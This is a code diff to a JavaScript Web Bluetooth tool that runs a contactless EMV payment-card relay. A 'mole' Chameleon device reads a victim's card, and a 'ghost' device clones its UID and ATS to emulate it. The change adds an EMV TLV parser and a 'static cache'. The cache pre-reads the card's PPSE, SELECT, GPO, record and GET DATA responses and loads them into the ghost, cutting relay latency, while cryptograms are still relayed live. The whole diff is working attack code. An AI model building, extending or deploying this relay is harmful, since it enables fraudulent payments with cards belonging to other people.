@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '2026-09-08a clear-cache-on-start';   // shown in the log so you can confirm which version loaded
+const BUILD = '2026-09-08b hybrid-cache-toggle';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -112,6 +112,81 @@ function parseAntiColl(d) {
   const sak = d[o++];
   const al = d[o++]; const ats = d.slice(o, o + al); o += al;
   return { uid, atqa, sak, ats };
+}
+
+// --- EMV TLV helpers (for the optional static cache) -------------------------
+// Collect the value bytes of every occurrence of `tag` (1- or 2-byte), recursing
+// into constructed templates. Minimal, tolerant walker (card-controlled input).
+function tlvFind(buf, tag) {
+  const out = [];
+  (function walk(b) {
+    let i = 0;
+    while (i < b.length) {
+      const first = b[i];
+      if (first === 0x00 || first === 0xff) { i++; continue; }
+      let t = first, tl = 1;
+      if ((first & 0x1f) === 0x1f) { if (i + 1 >= b.length) break; t = (b[i] << 8) | b[i + 1]; tl = 2; }
+      i += tl; if (i >= b.length) break;
+      let ln = b[i++];
+      if (ln & 0x80) { let nb = ln & 0x7f; ln = 0; while (nb-- > 0 && i < b.length) ln = (ln << 8) | b[i++]; }
+      const val = b.slice(i, i + ln); i += ln;
+      if (t === tag) out.push(val);
+      if (first & 0x20) walk(val);   // constructed
+    }
+  })(buf);
+  return out;
+}
+function parseAids(fci) { return tlvFind(fci, 0x4f); }
+function parseAfl(gpo) {
+  let afl = new Uint8Array(0);
+  const a = tlvFind(gpo, 0x94);
+  if (a.length) afl = a[0];
+  else { const t = tlvFind(gpo, 0x80); if (t.length && t[0].length > 2) afl = t[0].slice(2); }
+  const out = [];
+  for (let i = 0; i + 3 < afl.length; i += 4) out.push({ sfi: afl[i] >> 3, r1: afl[i + 1], r2: afl[i + 2] });
+  return out;
+}
+function sw9000(r) { return r && r.length >= 2 && r[r.length - 2] === 0x90 && r[r.length - 1] === 0x00; }
+
+// Pre-read the card's STATIC EMV flow over the mole session and return cmd->resp
+// pairs to load into the ghost. Relays are live (M.relayApdu); the returned pairs
+// are what the ghost then serves instantly. GENERATE AC / a real-PDOL GPO are NOT
+// cached (their bytes won't match), so they fall through to live relay per tap.
+async function buildStaticCache(M) {
+  const pairs = [];
+  const PPSE = hexToBytes('00A404000E325041592E5359532E444446303100');
+  const GETDATA = [0x9f13, 0x9f17, 0x9f36, 0x9f4f, 0x9f5b, 0x9f79];
+  const rly = async (apdu) => { try { const r = await M.relayApdu(apdu); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
+  const fci = await rly(PPSE);
+  if (!(fci.length > 2)) { log('cache: PPSE relay failed — skipping cache', 'warn'); return pairs; }
+  pairs.push({ cmd: PPSE, resp: fci });
+  const aids = parseAids(fci);
+  log(`cache: PPSE ${fci.length}B, AIDs ${aids.map(a => hxc(a)).join(', ')}`);
+  for (const aid of aids) {
+    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
+    const sr = await rly(sel);
+    if (!sw9000(sr)) { log(`cache: SELECT ${hxc(aid)} -> skip`, 'warn'); continue; }
+    pairs.push({ cmd: sel, resp: sr });
+    const gpo = hexToBytes('80A8000002830000');
+    const gr = await rly(gpo);
+    if (sw9000(gr)) {
+      pairs.push({ cmd: gpo, resp: gr });
+      for (const { sfi, r1, r2 } of parseAfl(gr)) {
+        for (let rec = r1; rec <= r2 + 1; rec++) {
+          const rr = u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00]);
+          const rd = await rly(rr);
+          if (rd.length >= 2) pairs.push({ cmd: rr, resp: rd });
+        }
+      }
+    }
+    for (const tag of GETDATA) {
+      const gd = u8([0x80, 0xca, (tag >> 8) & 0xff, tag & 0xff, 0x00]);
+      const rd = await rly(gd);
+      if (rd.length >= 2) pairs.push({ cmd: gd, resp: rd });
+    }
+  }
+  log(`cache: built ${pairs.length} static pairs`, 'ok');
+  return pairs;
 }
 
 // --- BLE device wrapper ------------------------------------------------------
@@ -245,6 +320,11 @@ class ChameleonBLE {
   // sets them, but they are flash-backed and persist, so a stray cache (e.g. from a
   // debug tool) would make the ghost answer from cache instead of relaying live.
   clearStaticResponses() { return this.sendCmd(CMD.HF14A_4_STATIC_RESP, u8([0])); }
+  // Load one cached cmd->resp pair: cmd_len(1) cmd(n) resp_len_be16(2) resp(m).
+  addStaticResponse(cmd, resp) {
+    const p = concat(u8([cmd.length]), cmd, u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp);
+    return this.sendCmd(CMD.HF14A_4_STATIC_RESP, p);
+  }
   apduRecv() { return this.sendCmd(CMD.HF14A_4_APDU_RECV, new Uint8Array(0), 2500); }
   apduSend(resp) { return this.sendCmd(CMD.HF14A_4_APDU_SEND, concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp)); }
   // Grouped: deliver `resp` (may be empty = pure blocking recv) AND wait on-device
@@ -480,12 +560,17 @@ async function safeProbe(dev) {
   catch (_) { return false; }
 }
 
-async function armGhost(anti, slot) {
+async function armGhost(anti, slot, staticPairs) {
   await ghost.setActiveSlot(slot);
   await ghost.setSlotTagType(slot, TAG_HF14A_4);
   await ghost.setSlotEnable(slot, SENSE_HF, true);
   try { await ghost.clearStaticResponses(); } catch (e) {}  // safety: never serve a stale cache
   await ghost.setAntiColl(anti);   // anti-coll BEFORE emulator mode
+  if (staticPairs && staticPairs.length) {
+    let n = 0;
+    for (const p of staticPairs) { try { await ghost.addStaticResponse(p.cmd, p.resp); n++; } catch (e) {} }
+    log(`loaded ${n}/${staticPairs.length} cached responses into the ghost`, 'ok');
+  }
   await ghost.changeMode(false);   // tag / emulator mode
 }
 async function armEmulation(anti) { await ghost.setAntiColl(anti); await ghost.changeMode(false); }
@@ -521,6 +606,7 @@ async function startRelay() {
   const mode = document.querySelector('input[name=mode]:checked').value;
   const gate = (mode === 'B');
   const slot = parseInt($('slot').value, 10) || 1;
+  const useCache = !!($('cache') && $('cache').checked);   // hybrid static cache (opt-in)
   // Adaptive poll: tight while a transaction is live (the phone is WTX-stalled
   // waiting on us, so every ms of poll gap is added latency), relaxed when idle
   // to spare BLE/CPU/battery. Safe on a slow link: the transport is strictly
@@ -550,7 +636,12 @@ async function startRelay() {
     if (!anti) { return; }            // stopped while waiting
     log(`cloned card UID=${hex(anti.uid)} ATQA=${hex(anti.atqa)} SAK=${anti.sak.toString(16)} ATS=${hex(anti.ats)}`, 'ok');
 
-    await armGhost(anti, slot);
+    let staticPairs = null;
+    if (useCache) {
+      log('cache ON: pre-reading card static flow (one-time, adds a few s to Start)…', 'ok');
+      staticPairs = await buildStaticCache(M);   // read PPSE/SELECT/GPO/records/GETDATA off the live card
+    }
+    await armGhost(anti, slot, staticPairs);
     let armed = true;
     ghost.setLed(1).catch(() => {}); setLedUI('ghost', 'green'); setLedUI('mole', 'green');
     if (gate) log('MODE B: ghost withholds emulation until board2 has the card.', 'ok');
